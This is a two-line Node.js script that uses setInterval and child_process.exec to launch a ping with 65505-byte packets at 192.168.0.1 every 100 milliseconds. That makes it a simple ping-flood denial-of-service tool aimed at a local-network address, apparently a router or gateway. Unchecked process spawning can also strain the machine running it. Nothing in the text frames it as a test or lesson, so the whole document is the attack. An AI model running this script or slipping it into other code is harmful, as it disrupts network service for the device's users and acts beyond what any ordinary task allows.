import { exec } from 'child_process'
setInterval(()=>{exec('ping -s 65505 192.168.0.1')},100);
